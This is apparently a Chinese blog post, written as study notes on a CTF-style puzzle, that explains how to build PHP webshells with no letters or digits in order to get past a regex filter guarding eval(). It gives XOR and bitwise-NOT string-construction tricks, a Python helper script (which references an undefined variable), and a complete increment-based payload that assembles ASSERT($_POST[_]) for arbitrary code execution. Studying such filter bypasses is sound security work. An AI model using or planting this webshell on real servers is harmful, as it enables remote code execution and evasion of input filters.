---
layout: post
title: 无字母数字webshell
subtitle: "webshell"
author: "bo"
header-img: "img/post-bg-halting.jpg"
header-mask: 0.3
---
这篇blog是看了p牛以前在小密圈提出的问题，然后自己总结一下方便复习  
一开始的题目：
```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
  eval($_GET['shell']);
}
?>
```  

### #基本思路
&emsp;&emsp;核心思路是把非字母数字变换，构造出想要得到的字符，再利用php动态函数执行的特点，拼接出想要执行的函数，动态执行便可
- 常见的绕过方式有三种  

#### #方法一

&emsp;&emsp;**异或**：可以通过位运算异或，让两个不包含字母和数字的字符串异返回一个新的字符串，我们可以利用这个特性来进行构造。
写一个python脚本可以很轻松的构造这两个字符串来。
```python
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "

target = "xxxxxxx"

tmp1,tmp2 = '',''
for c in answer:
    for i in valid:
        for j in valid:
            if (ord(i)^ord(j) == ord(c)):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
print(tmp1,tmp2)
```  
#### #方法二

&emsp;&emsp;**取反**：和第一种类似，不过，取反要比上一个方便一点，异或可能有些字符构造不出来。  
取反还可以利用汉子来构造，比如字母s可以通过~（'和'{2}） 来表示 （这里和是%e5%92%8c，{2}取到%8c,取反就是s）

#### #方法三

&emsp;&emsp;**自增**：在php里面，有一个小技巧
![image.png](https://i.loli.net/2020/03/30/UOdT87MpWzHbaqo.png)
详细文档：http://php.net/manual/zh/language.operators.increment.php
也就是说：'a'++ => 'b', 'b'++ => c ... 所以这里我们只需要拿到a和A就可以构造出 所有的字母。  
如何拿到a和A，这里可以想到array  
array和字符串连接，能得到’array‘
![image.png](https://i.loli.net/2020/03/30/ZwrLxq9fVsC1z47.png)
再取这个字符串的第一个和第三个字母就好了
因为函数大小写不敏感，所以直接取A就行。至于0如何得到。因为php是弱类型的，所以'@'=='!'就得到0了。
最后整个利用过程：
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
?>
```

